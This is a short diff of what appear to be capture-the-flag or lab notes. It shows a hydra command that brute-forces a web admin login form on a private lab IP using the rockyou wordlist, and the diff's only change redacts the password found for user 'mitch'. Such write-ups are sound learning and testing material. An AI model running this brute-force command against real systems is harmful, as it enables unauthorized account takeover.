@@ -13,4 +13,4 @@ Command:
 hydra -L users.txt -P ~/hdd/wordlists/SecLists/Passwords/Leaked-Databases/rockyou.txt -t 64 10.112.191.243 http-post-form "/simple/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:F=User name or password incorrect"
 
 Result:
-[80][http-post-form] host: 10.112.191.243   login: mitch   password: secret
+[80][http-post-form] host: 10.112.191.243   login: mitch   password: [REDACTED]
